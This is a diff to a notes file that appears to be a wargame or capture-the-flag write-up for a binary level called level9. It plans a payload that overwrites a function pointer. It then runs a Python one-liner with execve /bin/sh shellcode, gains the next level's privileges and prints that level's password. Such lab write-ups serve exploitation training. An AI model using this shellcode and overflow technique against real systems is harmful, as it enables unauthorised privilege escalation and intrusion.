@@ -200,10 +200,11 @@ shellcode
    0x08048693 <+159>:	call   edx                      ->i need to make this a shellcode
 
 #+end_src
-####
+#
 payload should work this way -> overwrite edx for get the shellcode when call it
 4 that i need to write the function in the following instance. this is gonna be deref two times.
 overwrite function ptr = ptr begin of payload = ptr begin shellcode -> begin
+
              4 B       28 B        76 B        4 B
 payload : shell_addr + shellcode + padding + buffer_addr
           [4 bytes]   [28 bytes]  [76 bytes]  [4 bytes] = 108 + 4
@@ -219,9 +220,10 @@ python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\
 0000060: 4141 4141 4141 410c a004 080a            AAAAAAA.....
 
 
-# execution
+#+begin_src shell
  ./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 76 + "\x0c\xa0\04\x08"')
 $ id
 uid=2009(level9) gid=2009(level9) euid=2010(bonus0) egid=100(users) groups=2010(bonus0),100(users),2009(level9)
 $ cat /home/user/bonus0/.pass
 f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
+#+end_src
